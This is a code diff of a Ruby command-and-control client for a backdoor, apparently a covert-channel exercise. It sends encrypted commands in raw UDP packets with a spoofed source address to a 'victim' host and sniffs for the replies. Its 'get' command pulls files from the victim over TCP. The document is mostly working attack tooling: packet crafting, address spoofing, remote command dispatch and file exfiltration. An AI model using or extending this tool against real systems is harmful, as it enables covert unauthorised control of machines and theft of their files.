@@ -2,9 +2,12 @@
 
 # Ruby Libraries to load
 require "socket"
-require "pcaplet"
+#require "pcaplet"
+require "packetfu"
 require "./lib_trollop.rb"
 require "./dispatch.rb"
+
+include PacketFu
 
 # Command line argument parsing
 opts = Trollop::options do
@@ -19,29 +22,17 @@ where [options] are:
 	EOS
 	
 	opt :host, "Victim IP", :short => "-H", :type => :string, :default => "127.0.0.1" # string --host <s>, default 127.0.0.1
-	opt :cport, "Victim Command Port", :short => "-c", :default => 8000 # integer --cport <i>, default 8000
-	opt :dev, "Victim File Transfer Port", :short => "d", :default => "lo" # integer --fport <i>, default 8001
+	opt :cport, "Victim Command Port", :short => "c", :default => 8000 # integer --cport <i>, default 8000
+	opt :rport, "Response Port", :short => "r", :default => 8001 #integer --rpot <i>, default 8001
+	opt :dev, "Victim File Transfer Port", :short => "d", :default => "lo" # integer --dev <s>, default lo
 end
 
 # Make sure that we are running as root
 raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
 
 # Create UDP Socket for Commands
-udp = UDPSocket.new
+udp = UDPPacket.new
 dis = Dispatch.new
-
-# Create child process for sniffing
-child = fork {
-    cap = Pcap::Capture.open_live(opts[:dev])
-    cap.setfilter("udp and src host " + opts[:host].to_s + " and src port " + opts[:cport].to_s)
-
-    cap.loop do |pkt|
-	    p "Response received from: " + pkt.ip_src.to_s
-	    p dis.decrypt(pkt.udp_data.to_s)
-    end
-
-    cap.close
-}
 
 while 1 do
 	print "> "
@@ -50,7 +41,6 @@ while 1 do
 	cmds = cmd.split(' ')
 	
 	if cmds[0] == "quit" or cmd[0] == "q" then # Quit terminal
-	    Process.kill('INT', child) # Kills the worker child
 		abort("Quitting...")
 	elsif cmds[0] == "help" or cmds[0] == "h" then # Show commands
 		print "\nCommands:\n\n"
@@ -59,11 +49,20 @@ while 1 do
 		print "\tget [filename] <port>: Gets a specified file from the victim\n"
 		print "\tls [directory]: Gets a listing of the files and directorie of a specific directory\n"
 	elsif cmds[0] == "get" then # Get file
-		data = dis.encrypt(cmd)
-		udp.send(data, 0, opts[:host], opts[:cport])
+		hash = dis.encrypt(cmd)
+		
+		udp.udp_src = rand(0xfff - 1024) + 1024
+		udp.udp_dst = opts[:cport]
+
+		udp.ip_saddr = "127.0.0.1"
+		udp.ip_daddr = opts[:host]
+
+		udp.payload = hash
+		udp.recalc
+		udp.to_w(opts[:dev])
 		
 		# Create TCP Connection for file Transfer
-		tcp = TCPServer.new('', cmds[2])
+		tcp = TCPServer.new('', cmds[3])
 		
 		# Wait for victim to connect
 		print "Waiting for victim to connect to port: " + cmds[2] + "...\n"
@@ -89,6 +88,26 @@ while 1 do
 		print "Data transfer complete!\n"
 	else # Normal commands
 		hash = dis.encrypt(cmd)
-		udp.send(hash, 0, opts[:host], opts[:cport])
+
+		udp.udp_src = rand(0xfff - 1024) + 1024
+		udp.udp_dst = opts[:cport]
+
+		udp.ip_saddr = "127.0.0.1"
+		udp.ip_daddr = opts[:host]
+
+		udp.payload = hash
+		udp.recalc
+		udp.to_w(opts[:dev])
+	
+		filter = "udp and src host " + opts[:host] + " and dst port " + opts[:rport].to_s
+
+		cap = Capture.new(:iface => opts[:dev], :start => true, :filter => filter)
+
+		# Capture packets
+		cap.stream.each do |pkt|
+			packet = Packet.parse pkt
+			print dis.decrypt packet.payload
+			break
+		end
 	end
 end
